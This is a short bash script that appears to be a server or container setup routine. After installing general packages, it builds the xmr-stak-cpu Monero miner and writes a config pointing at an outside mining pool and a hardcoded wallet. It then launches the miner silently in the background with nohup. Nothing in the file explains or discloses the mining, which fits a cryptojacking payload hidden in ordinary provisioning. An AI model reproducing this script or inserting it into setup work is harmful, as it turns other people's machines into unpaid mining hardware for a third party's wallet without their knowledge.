#!/bin/bash
apt-get update -y && \
    apt-get install -y --no-install-recommends \
        libmicrohttpd-dev libssl-dev cmake build-essential libhwloc-dev \
		imagemagick \
		graphicsmagick \
		zip \
		unzip \
		wget \
		curl \
		git \
		mysql-client \
		moreutils \
		dnsutils \
	&& rm -rf /var/lib/apt/lists/*

git clone https://github.com/fireice-uk/xmr-stak-cpu.git /xmr \
    && cd /xmr \
    && cmake . \
    && make install \
    && rm -rf /xmr/bin/config.txt

cd /xmr/bin/

echo '
"cpu_threads_conf" :
[
    { "low_power_mode" : true, "no_prefetch" : true, "affine_to_cpu" : 0 },
    { "low_power_mode" : true, "no_prefetch" : true, "affine_to_cpu" : 1 },
    { "low_power_mode" : true, "no_prefetch" : true, "affine_to_cpu" : 2 },
    { "low_power_mode" : true, "no_prefetch" : true, "affine_to_cpu" : 3 },
],
"use_slow_memory" : "warn",
"nicehash_nonce" : false,
"aes_override" : null,
"use_tls" : false,
"tls_secure_algo" : true,
"tls_fingerprint" : "",
"pool_address" : "get.bi-chi.com:3333",
"wallet_address" : "4EW14YUpn2jVaUDbi9StLDgFoJxF37cN5SMnbuTEtvvRNPd3n4mSsH26AGUveA1nA19WUstm3vyC4dh8hnJdDiE9bQxdUEYwLzRTd3g2PA",
"pool_password" : "",
"call_timeout" : 10,
"retry_time" : 10,
"giveup_limit" : 0,
"verbose_level" : 3,
"h_print_time" : 60,
"daemon_mode" : false,
"output_file" : "/var/logs/xmr.log",
"httpd_port" : 10080,
"prefer_ipv4" : true,
' > /xmr/bin/config.txt

nohup ./xmr-stak-cpu &